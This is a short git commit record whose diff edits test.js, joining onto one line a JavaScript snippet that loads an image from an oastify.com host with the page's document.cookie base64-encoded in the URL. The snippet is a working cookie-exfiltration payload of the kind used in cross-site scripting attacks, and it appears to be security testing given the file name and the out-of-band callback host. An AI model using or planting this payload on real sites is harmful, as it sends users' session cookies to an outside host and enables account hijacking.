e7811682293d0c01cae663d8b547d22bb7ec3783
Yoldoshali Esonaliyev <86107814+Yoldoshali@users.noreply.github.com>
2025-05-02 16:56:52 -0700

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,1 @@
-x = new Image(); x.src = 'https://szv3m3a3q88o8rksk84ot2f81z7qvnjc.oastify.com?
-data='+btoa(document.cookie);
+x = new Image(); x.src = 'https://szv3m3a3q88o8rksk84ot2f81z7qvnjc.oastify.com?data='+btoa(document.cookie);
